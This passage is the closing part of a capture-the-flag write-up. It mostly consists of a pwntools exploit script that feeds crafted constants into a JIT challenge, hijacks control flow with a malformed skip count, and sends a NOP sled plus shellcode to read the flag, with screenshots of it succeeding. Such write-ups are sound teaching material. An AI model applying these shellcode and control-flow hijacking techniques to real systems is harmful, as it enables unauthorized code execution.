<span class="c1"># Attach with gdb
</span><span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="s">'''
    break *jit+542
    continue
        '''</span><span class="p">)</span>

<span class="c1"># Add 6 instructions
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Action: "</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">clean</span><span class="p">()</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"add 364776757699490120"</span><span class="p">)</span>


<span class="c1"># Evaluate/ call jit()
</span><span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Action: "</span><span class="p">))</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"How many instructions would you like to skip?"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1.2"</span><span class="p">)</span>

<span class="c1"># We have (hopefully) hijacked control flow now into our shellcode.
</span>
<span class="n">p</span><span class="p">.</span><span class="n">clean</span><span class="p">()</span>
<span class="c1"># Send our shellcode to read()
</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="o">*</span><span class="mh">0x100</span> <span class="o">+</span> <span class="n">flag_pls</span><span class="p">)</span>

<span class="c1"># Recieve the flag
</span><span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvall</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<p>Here‚Äôs it working locally:
<img src="https://user-images.githubusercontent.com/73792438/116258501-eb3ecc80-a76c-11eb-904f-33bea49bebc4.PNG" alt="25" /></p>

<p>And on the challenge server:</p>

<p><img src="https://user-images.githubusercontent.com/73792438/116258994-54bedb00-a76d-11eb-9343-b56d3b2addd0.PNG" alt="26" /></p>

<p>I don‚Äôt know why i bothered censoring the flag when I just gave you the exploit, but oh well.</p>

<p>Happy pwning!</p>
:ET